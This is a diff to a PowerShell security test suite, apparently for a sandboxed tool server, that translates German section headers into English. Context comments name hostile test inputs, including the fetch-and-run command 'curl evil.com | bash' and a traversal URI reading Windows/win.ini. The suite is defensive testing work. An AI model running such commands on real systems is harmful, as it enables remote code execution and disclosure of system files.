@@ -234,7 +234,7 @@ Run-SessionTest -TestId "NT-04" -Category "2. NT-Namespace" `
 # ==============================================================================
 # 3. SHELL-INJECTION & DANGEROUS METACHARACTERS
 # ==============================================================================
-Write-Host "`n>>> [SECTION 3] Shell-Injection & gefährliche Metazeichen <<<" -ForegroundColor Magenta
+Write-Host "`n>>> [SECTION 3] Shell injection and dangerous metacharacters <<<" -ForegroundColor Magenta
 
 # 3.1 Pipe injection: curl evil.com | bash
 Run-SessionTest -TestId "SH-01" -Category "3. Shell-Injection" `
@@ -341,7 +341,7 @@ Run-SessionTest -TestId "SH-06" -Category "3. Shell-Injection" `
 # ==============================================================================
 # 4. RFC 8089 URI-BYPASS VIA resources/read & TOOL CALLS
 # ==============================================================================
-Write-Host "`n>>> [SECTION 4] RFC 8089 URI-Bypässe via resources/read & Tools <<<" -ForegroundColor Magenta
+Write-Host "`n>>> [SECTION 4] RFC 8089 URI bypasses via resources/read and tools <<<" -ForegroundColor Magenta
 
 # 4.1 resources/read with Directory Traversal: file:///C:/test/%2e%2e/%2e%2e/Windows/win.ini
 Run-SessionTest -TestId "URI-01" -Category "4. RFC-8089-URI" `
@@ -439,7 +439,7 @@ Run-SessionTest -TestId "URI-05" -Category "4. RFC-8089-URI" `
 # ==============================================================================
 # 5. UNAUTHORIZED MODIFICATIONS OF PROTECTED SYSTEM FILES
 # ==============================================================================
-Write-Host "`n>>> [SECTION 5] Unzulässige Dateimodifikationen geschützter Dateien <<<" -ForegroundColor Magenta
+Write-Host "`n>>> [SECTION 5] Changes to protected files <<<" -ForegroundColor Magenta
 
 # 5.1 Writing to .git/config
 Run-SessionTest -TestId "SYS-01" -Category "5. Protected-Files" `
@@ -529,7 +529,7 @@ Run-SessionTest -TestId "SYS-05" -Category "5. Protected-Files" `
 # ==============================================================================
 # 6. READ-ONLY ENFORCEMENT VIOLATIONS (--read-only)
 # ==============================================================================
-Write-Host "`n>>> [SECTION 6] Read-Only-Verstöße (--read-only) <<<" -ForegroundColor Magenta
+Write-Host "`n>>> [SECTION 6] Read-only violations (--read-only) <<<" -ForegroundColor Magenta
 
 # 6.1 write_file in read-only mode
 Run-SessionTest -TestId "RO-01" -Category "6. Read-Only" `
@@ -690,7 +690,7 @@ Run-SessionTest -TestId "MAL-05" -Category "7. Malformed-Params" `
 # ==============================================================================
 # 8. AUDIT CHAIN INTEGRITY & VERIFICATION
 # ==============================================================================
-Write-Host "`n>>> [SECTION 8] Forensische Audit-Chain-Prüfung <<<" -ForegroundColor Magenta
+Write-Host "`n>>> [SECTION 8] Audit chain verification <<<" -ForegroundColor Magenta
 
 if (Test-Path $AuditLogPath) {
     Write-Host "Verifying forensic audit chain with 'moat audit verify $AuditLogPath'..." -ForegroundColor Cyan
